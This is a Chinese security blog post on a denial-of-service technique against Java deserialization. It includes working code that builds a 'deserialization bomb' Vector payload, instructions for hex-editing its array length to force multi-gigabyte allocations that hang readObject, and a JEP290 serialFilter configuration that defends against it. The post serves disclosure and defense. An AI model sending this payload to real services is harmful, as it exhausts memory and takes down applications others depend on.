Java反序列化机制拒绝服务的利用与防御
====================

前言
--

前段时间翻ObjectInputStream代码，发现一处可以利用手工构造的序列化数据来虚耗内存的问题，以为可以混个CVE。

提交给Oracle后，被驳回，得知JEP290机制可以进行防御（虽然默认不开）。

向官方确认没问题后，输出了这篇文章。

问题简述
----

通过输入简单修改过的序列化数据，可实现占用任意大小的内存，结合其他技巧，可使ObjectInputStream.readObject方法卡住，占用的内存不被释放，导致其他正常业务进行内存申请时报OutOfMemoryError异常来进行拒绝服务攻击。

问题效果比较接近之前的Fastjson拒绝服务问题

可通过配置JEP290机制进行防御

本篇测试环境使用jdk1.8.0\_281

分析
--

在反序列化数组时, 在ObjectInputStream.readArray 方法中，会从InputStream读取数组长度，并按照数组长度来创建数组实例，那么主要我们对序列化数据中的数组大小进行修改，此处就可以无意义的消耗内存。

（这个也是没办法的事情，毕竟输入来自于流，没法直接确定剩余数据大小）

（注意箭头上面实际上有个filterCheck，这个就是JEP290的检查点）

![](https://shs3.b.qianxin.com/butian_public/f5266fc80eb54a57d1445fbd9362a23a1.jpg)  
在创建好指定长度的数组实例后，就会开始依次从流中读取数组中所存储的对象。

由于我们输入的数据实际没有那么长（例如实际数组长度是123，我们修改后的是MAX\_INT-2=2147483645个，没有那么多数据），在读取过程中会出现错误，所以此处需要想办法让其卡住，以至于不出错退出。

![](https://shs3.b.qianxin.com/butian_public/f3fa4f4ebbd87ca9275b0180a8b251e95.jpg)

经过查找发现了一个《effective java》中提到的一个叫反序列化炸弹的技巧，此处不多赘述，请直接看如下内容：

<https://blog.csdn.net/nevermorewo/article/details/100100048>

<https://homepages.ecs.vuw.ac.nz/~alex/files/DietrichJezekRasheedTahirPotaninECOOP2017.pdf>

该技巧可以构造一个特殊的多层HashSet对象，使其序列化数据在反序列化过程中一直执行，不会报错。

利用该技巧使我们构造数组第一个元素为“反序列化炸弹对象”，使其一直停在第一个对象的readObject流程中。

序列化包构造
------

Java原生的Vector类中包含Object数组并且支持序列化，我们使用该类进行构造。

使用代码构造原始类：

```php
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.HashSet;
 import java.util.Set;
 import java.util.Vector;

 public class test {
   public static void main(String[] args){
     //Effective Java的反序列化炸弹部分构造
     Set<Object> root = new HashSet<>();
     Set<Object> s1 = root;
     Set<Object> s2 = new HashSet<>();
     for (int i = 0; i < 100; i++) {
       Set<Object> t1 = new HashSet<>();
       Set<Object> t2 = new HashSet<>();
       t1.add("foo"); // Make t1 unequal to t2
       s1.add(t1); s1.add(t2);
       s2.add(t1); s2.add(t2);
       s1 = t1;
       s2 = t2;
     }
     FileOutputStream FIS = null;
     try {
       FIS = new FileOutputStream("evil.obj");
     } catch (FileNotFoundException e) {
       e.printStackTrace();
     }
     try {
       ObjectOutputStream OOS = new ObjectOutputStream(FIS);
       Vector<Object> vec = generateObj(root);
       //如果想消耗更多内存可以多加包裹几层vector
       //vec = generateObj(vec);
       OOS.writeObject(vec);
     } catch (IOException e) {
       e.printStackTrace();
     } catch (NoSuchFieldException e) {
       e.printStackTrace();
     } catch (IllegalAccessException e) {
       e.printStackTrace();
     }
   }
   private static Vector<Object> generateObj(Object root) throws NoSuchFieldException, IllegalAccessException {
     Vector<Object> vec = new Vector<>();
     //为了后面方便修改替换，这里把vector的内部数组长度改为123
     Object[] objects1 = new Object[123];
     //设置数组的第一个元素为
     objects1[0]=root;
     Field elementData = vec.getClass().getDeclaredField("elementData");
     elementData.setAccessible(true);
     elementData.set(vec,objects1);
     return vec;
   }
 }
```

2.把Object数组的长度从123（16进制为00 00 00 7B）改成一个比较大的数（java最大允许的数组长度为MAX\_INT-2=2147483645，十六进制为7F FF FF FD）

通过HxD修改序列化数据中的数组长度，修改前：

![](https://shs3.b.qianxin.com/butian_public/fcd2f7efe26d9dfbef05dc64ec6d4f77f.jpg)

修改后：

![](https://shs3.b.qianxin.com/butian_public/fe581b749fd903e94eb751ae92849147e.jpg)

（感觉以上过程可以用n1nty师傅的https://github.com/QAX-A-Team/SerialWriter实现)

反序列化
----

运行代码：

```php
 import java.io.*;
  public class testRead {
    public static void main(String[] args){
      try {
        System.out.println("Start ReadObject");
        FileInputStream FIS = new FileInputStream("evil.obj");
        ObjectInputStream OIS = new ObjectInputStream(FIS);
        OIS.readObject();
      } catch (FileNotFoundException e) {
        e.printStackTrace();
      } catch (IOException e) {
        e.printStackTrace();
      } catch (ClassNotFoundException e) {
        e.printStackTrace();
      }
    }
  }
```

调试时可以看到调用Array.newInstance创建大小为2147483645的数组，单次占用空间大约8GB,通过包裹多层Vector可以使占用大小不断扩大。

![](https://shs3.b.qianxin.com/butian_public/f2b3985de96bfc9fb988aca6a57fe5eb0.jpg)

之后在反序列化数组中元素时，会卡在反序列化炸弹的反序列化流程中。

![](https://shs3.b.qianxin.com/butian_public/f510a0b9a16f2c4dba68da44c595c0cdb.jpg)

运行结果：

1.给-Xmx8100M的条件下执行会直接OOM

![](https://shs3.b.qianxin.com/butian_public/fe835ebfc8b9b067904d0e5d2fe0c721e.jpg)

2.给-Xmx16100M的情况下会在readObject时卡住，并占用大量内存：

![](https://shs3.b.qianxin.com/butian_public/f1d8b182f86bab2e78c47dff0e947b00f.jpg)

防御（配置JEP290机制）
--------------

官方从8u121，7u13，6u141分别支持了JEP290，详细可以看一下隐形人师傅的这篇文章：

<https://blog.csdn.net/u011721501/article/details/78555246>

可以通过下面两处进行配置：

系统属性 jdk.serialFilter  
conf/security/java.properties中的安全属性 jdk.serialFilter  
JEP290除了目前提到较多的对反序列化类的类型进行过滤外，还支持如下参数：

maxdepth=value — the maximum depth of a graph（图的最大层级，看代码是对象嵌套的层级数）  
maxrefs=value — 内部引用的最大数量  
maxbytes=value — 输入流的最大长度  
maxarray=value — 最大数组长度  
所以针对上述攻击方式，可使用maxdepth以及maxarray进行限制,加入启动参数：

-Djdk.serialFilter=maxarray=100000;maxdepth=20

![](https://shs3.b.qianxin.com/butian_public/f3e1a54521dfb8684fdb0fe302309b8b4.jpg)

成功的进行了防御。

结尾
--

Java序列化、反序列化机制用在Java开发的方方面面，目前已知的反序列化输入点很多。

通过JEP290机制可防御该问题，不过虽然JEP290机制已经推出多时，但是目前开启的并不太多。

所以该方法影响面还是很大的，只要数组长度配置的好，就能最大限度的虚耗内存，妨碍正常业务的运转。

建议Java类业务开启JEP290来防御此类攻击。

引用
--

反序列化炸弹相关：

<https://blog.csdn.net/nevermorewo/article/details/100100048>

<https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java>

JEP290相关：

<http://openjdk.java.net/jeps/290>

[https://support.oracle.com/rs?type=doc&amp;id=2591118.1](https://support.oracle.com/rs?type=doc&id=2591118.1)

<https://blog.csdn.net/u011721501/article/details/78555246>

原文首发与作者博客，原文地址为https://blog.csdn.net/fnmsd/article/details/115672540